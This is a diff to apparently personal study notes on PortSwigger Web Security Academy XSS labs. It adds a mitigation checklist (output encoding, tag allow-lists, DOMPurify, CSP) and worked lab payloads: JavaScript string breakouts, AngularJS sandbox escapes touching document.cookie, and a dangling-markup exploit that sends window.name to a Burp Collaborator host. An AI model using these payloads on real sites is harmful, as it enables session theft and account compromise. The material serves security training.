@@ -2231,7 +2231,20 @@ Content-Type: application/json
 - Submit random alphanumeric values to see if the value is reflected in the response
 - Determine the reflection context (text between HTML tag, tag attribute, JavaScript string)
 - Use Burp Repeater to test a candidate payload > if payload is modified or blocked > test alternative payloads	> Test the attack in a browser
-  
+
+**Mitigation**
+- Encode data on output
+  < converts to: &lt;	
+  > converts to: &gt;	
+- Validate input on arrival
+- filter out potentially harmful tags and JavaScript
+  - remove onclick, onerror, and the <script> tags.
+- Whitelist Specific Tags and Attributes
+  - ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
+  - ALLOWED_ATTR: ['href', 'title']	
+- use a JavaScript library that performs filtering and encoding in the user's browser, such as DOMPurify; Bleach (Python); Sanitize-HTML (Node.js); htmlentities (PHP); htmlEncode, jsEscape (Js)
+- set CSP  `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; object-src 'none'">`
+
 ### XSS Lab
 **XSS between HTML tags**
 - **Reflected** XSS into HTML context with **nothing encoded**	
@@ -2277,8 +2290,8 @@ Content-Type: application/json
 - Stored XSS into anchor **href attribute with double quotes** HTML-encoded
   - <a id="author" `href="www.attacker1.com"`>attacker</a>
   - in website field, input `javascript:alert(1)` > `<a id="author" href="javascript:alert(1)">yuyu</a>`
-- Reflected XSS in canonical **link** tag
-  - Page source: <link rel="canonical" href='https://0a4b00e3035d840580ef6c4c005c00d6.web-security-academy.net/?hello'/>
+- Reflected XSS in canonical **link** tag  
+  - Page source: `<link rel="canonical" href='https://0a4b00e3035d840580ef6c4c005c00d6.web-security-academy.net/?hello'/>`  
   - rel="canonical": Indicates that the link is the canonical (authoritative) URL for the page.
   - `%27` = `'`	
   - browse `'accesskey='x'onclick='alert(1)`	
@@ -2318,21 +2331,56 @@ Content-Type: application/json
   - break out of the JavaScript string and inject an alert
     `\'-alert(1)//` > `var searchTerms = '\\'-alert(1)//';`
   - the **single quote** (') ends a string in JavaScript prematurely, and **alert(1)** is then executed as a separate command. The **//** part is used to comment out the rest of the JavaScript line
-- Reflected XSS in a JavaScript URL with some characters blocked
+- Reflected XSS in a **JavaScript URL** with some characters blocked
   - `postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
   - `27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
     - %27 is the URL-encoded version of the single quote ('), used to prematurely close a string or break out of a specific context	
   - Initial Parameter Injection: `%27`
   - Starting a New JavaScript Statement: `},x=x=%3E{...}`
     - This begins an object destructuring assignment, where x is being defined as a function with the arrow function syntax x => {...}	
-  - Throwing an Error and Defining an onerror Handler: `throw/**/onerror=alert,1337`
-    - triggers the onerror event handler
-  - Overriding `toString: toString=x`
-  - Coercing window to a String: `window%2b%27%27`
-  - Ending the Payload: `{x:%27`
-- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped. 
+  - Throwing an Error and Defining an onerror Handler: `throw/**/onerror=alert,1337` 
+    - triggers the onerror event handler  
+  - Overriding `toString: toString=x` 
+  - Coercing window to a String: `window%2b%27%27` 
+  - Ending the Payload: `{x:%27`  
+- **Stored XSS into onclick event** with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped.  
+  - Normal payload in href `<a id="author" href="https://www.attacker.com" onclick="var tracker={track(){}};tracker.track('https://www.attacker.com');">yuyu</a>`  
+  - Test single quote `http://evil.com' +alert() + '` > `<a id="author" href="http://evil.com\' +alert() + \'" onclick="var tracker={track(){}};tracker.track('http://evil.com\' +alert() + \'');">yuyu</a>`  
+  - Use html entities `http://foo?&apos;-alert(1)-&apos;` > `<a id="author" href="http://foo?'-alert(1)-'"`  
+- Reflected XSS into a **template literal** with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+  - template literal in js var message = `0 search results for 'hello'`;
+  - Input `${alert(1)}` > var message = `0 search results for '${alert(1)}'`;
 
 **Client-side template injection**
+- Reflected XSS with **AngularJS** sandbox escape without strings (expert)
+  - The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox.
+  - An array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property  
+  - we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not
+  - visit the url `https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
+    ```
+    $scope.query = {};
+    var key = 'search';
+    $scope.query[key] = '1';
+    $scope.value = $parse(key)($scope.query);
+    	var key = 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)';
+    $scope.query[key] = '1';
+    $scope.value = $parse(key)($scope.query);
+    });
+    ```
+- Reflected XSS with AngularJS sandbox escape and CSP (expoert)
+  - The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object
+  - The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.
+  - the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z
+  - The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check
+  - Exploit server `search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';`
+    ```
+    <script>
+	location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+    </script>
+    ```
+- dddd
+
+**Exploiting XSS vulnerabilities**
 - Exploiting cross-site scripting to **steal cookies**
   - limitation: user not logged in, HttpOnly flag, block user IP, session time out	
   - Post comment and capture the session value in Burp Collaborator
@@ -2378,6 +2426,22 @@ Content-Type: application/json
   </script>
   ```
 
+**Dangling markup injection**
+- Reflected XSS protected by very **strict CSP**, with **dangling markup attack**
+  - Email param is vulnerable to XSS
+  - Exploit server
+    `<script> if(window.name) { new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?' encodeURIComponent(window.name); } else { location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email="><a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target=''; } </script>`
+    ```
+    <script> if(window.name) { 
+                new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name); } 
+             else {
+                location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27'; 
+              }
+    </script>
+    ```
+  - copy the CSRF token from 'Poll Now'
+  - Generate CSRF OoC and replace the CSRF token	
+- ddd
 
 - ddd
 - ddd
